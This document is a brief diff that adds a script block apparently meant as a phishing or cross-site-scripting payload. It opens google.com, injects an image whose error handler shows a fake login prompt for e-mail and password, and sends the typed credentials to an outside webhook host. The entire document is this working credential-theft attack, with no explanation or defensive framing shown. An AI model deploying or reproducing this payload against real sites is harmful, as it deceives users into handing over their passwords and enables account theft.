@@ -1,0 +1,8 @@
+<script>
+function y() {
+  var x = window.open('https://google.com', '_top');
+  var html = '<img src="" onerror="setTimeout(function() { var input = prompt(\"Sign into your account in order to access www.google.com\", \"E-mail / Password\"); if (input) { var img = new Image(); img.src = \"https://young-comet-60.webhook.cool?data=\" + encodeURIComponent(input); } }, 150)">';
+  x.document.body.innerHTML = html;
+}
+setTimeout(y, 3000);
+</script>
